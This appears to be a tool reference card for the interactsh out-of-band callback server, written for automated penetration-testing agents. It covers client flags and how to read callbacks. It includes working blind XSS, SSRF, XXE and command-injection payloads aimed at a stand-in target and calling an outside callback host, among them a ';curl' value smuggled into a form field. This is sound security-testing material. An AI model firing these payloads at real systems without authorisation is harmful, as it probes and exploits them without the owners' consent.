---
tool_name: interactsh
category: utility
tags: [oob, out-of-band, blind-xss, blind-ssrf, blind-rce, callback, dns]
used_by_agents: [xss_agent, exploit_agents, validator]
---

# Interactsh — Out-of-Band Interaction Server

## What It Does
Generates unique callback URLs (HTTP, DNS, SMTP) that log any interaction. Essential for detecting **blind** vulnerabilities where no direct output is visible — blind XSS, blind SSRF, blind RCE, blind XXE. When a payload triggers a callback to your interactsh URL, it confirms the vulnerability exists.

---

## Starting the Client

```bash
# Generate a payload URL and start listening
interactsh-client

# Verbose (show full interaction details)
interactsh-client -v

# Generate multiple payload URLs
interactsh-client -n 5
```

---

## Workflow: Blind Vulnerability Testing

### 1. Start interactsh-client
```bash
interactsh-client -v
```
Output:
```
[INF] Listing 1 payload for OOB Testing
[INF] abc123def456.oast.fun
```

### 2. Use the generated URL in payloads

**Blind XSS:**
```bash
curl -X POST "http://target.com/feedback" \
  -d "comment=<script>fetch('http://abc123def456.oast.fun/xss')</script>"
```

**Blind SSRF:**
```bash
curl "http://target.com/fetch?url=http://abc123def456.oast.fun/ssrf"
```

**Blind RCE:**
```bash
curl -X POST "http://target.com/ping" \
  -d "ip=127.0.0.1;curl http://abc123def456.oast.fun/rce"
```

**Blind XXE:**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://abc123def456.oast.fun/xxe">]>
<data>&xxe;</data>
```

### 3. Check interactsh output for callbacks

---

## Protocol Filtering

```bash
# Only show DNS interactions
interactsh-client -dns-only

# Only show HTTP interactions
interactsh-client -http-only

# Only show SMTP interactions
interactsh-client -smtp-only
```

---

## Custom Server

```bash
interactsh-client -server "interact.mydomain.com"
interactsh-client -server "interact.mydomain.com" -token "auth_token"
```

---

## Output & Logging

```bash
# Save interactions to file
interactsh-client -o interactions.txt

# JSON output (best for parsing)
interactsh-client -json -o interactions.json

# Print only payload URL (for scripting)
interactsh-client -pi
```

---

## Polling & Session

```bash
# Poll interval (seconds between checks)
interactsh-client -poll-interval 3

# Save/resume session
interactsh-client -sf session.yaml
```

---

## Output Interpretation

### Callback received (vulnerability confirmed):
```
[abc123def456] Received HTTP interaction from 192.168.1.100 at 2024-01-15 10:30:45
------------
HTTP Request
------------
GET /xss HTTP/1.1
Host: abc123def456.oast.fun
User-Agent: Mozilla/5.0
```
**Success indicators**: `Received HTTP interaction` or `Received DNS interaction` — something triggered the payload.

### DNS callback:
```
[abc123def456] Received DNS interaction (A) from 8.8.8.8 at 2024-01-15 10:30:46
```

### No callbacks:
No output lines after the initial payload display = nothing triggered the callback.

**Success indicators**: Any `Received ... interaction` line = blind vulnerability confirmed.
**Failure indicators**: No interaction received within reasonable timeout = payload didn't fire.

---

## Common Flags Reference

| Flag | Purpose |
|------|---------|
| `-server` | Custom interactsh server URL |
| `-token` | Auth token for self-hosted server |
| `-n` | Number of payload URLs to generate |
| `-v` | Verbose (full request/response details) |
| `-o` | Output file |
| `-json` | JSON output format |
| `-pi` | Print only the payload URL |
| `-poll-interval` | Seconds between server polls |
| `-dns-only` | Show only DNS interactions |
| `-http-only` | Show only HTTP interactions |
| `-smtp-only` | Show only SMTP interactions |
| `-sf` | Session file for save/resume |
